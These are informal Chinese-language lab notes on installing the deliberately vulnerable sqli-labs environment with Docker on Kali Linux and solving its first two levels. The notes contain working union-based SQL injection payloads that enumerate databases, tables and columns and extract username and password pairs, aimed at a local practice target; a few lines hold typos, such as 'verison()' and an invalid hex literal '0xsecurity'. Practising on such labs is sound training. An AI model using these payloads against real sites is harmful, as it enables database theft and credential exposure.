安装sqli-lab
一、docker安装
docker安装是最简单的，不需要配置环境，很推荐，特别推荐！首先得有一台Linux系统主机，虚拟机也可以，小博主win10系统装docker后不能安装sqli-labs,度娘也找不到原因，索性换了一个Linux系统，几步就安装好了

这里我用的是kali Linux2019.3版本的，有些Linux系统太老，可能不支持，如果不想升级系统，那就用第二种方法安装。

这是kali安装的命令，依次执行就可以了。这里我用的是root权限

root@kali:~# curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add

root@kali:~# echo 'deb https://download.docker.com/linux/debian stretch stable'> /etc/apt/sources.list.d/docker.list

root@kali:~# apt-get remove docker docker-engine docker.io containerd runc

root@kali:~# apt-get install apt-transport-https  ca-certificates   curl  gnupg2  software-properties-common

root@kali:~# apt-get update

root@kali:~# apt-get install docker-ce

之后输入docker-v验证是否安装成功
 拉取镜像到docker安装部署

root@kali:~# docker pull acgpiano/sqli-labs

root@kali:~# docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs



#---------------------------

?id=1

?id=1' 报错

?id=1' and 1=1 --+ 不报错

?id=1 and 1=2 --+ 报错

说明有注入漏洞

?id=1' and 1=2 union select 1,2,3 --+猜字段

三个字段

查数据库类型，和服务器版本


?id=1' and 1=2 union select 1,verison(),database()--+ 

http://127.0.0.1/Less-1/?id=1' and 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),group_concat(table_name) from information_schema.tables where table_schema=database() --+

查看所有的数据库，等同于select schema_name from information_schema.schemata\G。\G 替换;,以纵向报表的形式输出结果，有利于阅读。


查表名     table_schema='数据库名字'

http://127.0.0.1/Less-1/?id=1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3--+

查user表数据

http://127.0.0.1/Less-1/?id=1' and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='user'),3--+ '



group_concat(username,0x3a,password) from users

0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ':' ，用以分割pasword和username。



#------------查数据库

select schema_name from information_schema.schemata;

# ----------
?id=1 '报错     '
所以第二关不用加'   '
直接order by 猜测字段？



Encoding 下拉Hex Encode 0x 表示16 进至


?id=-1 union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=0x7365637572697479 --+

?id=-1 union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=0xsecurity --+



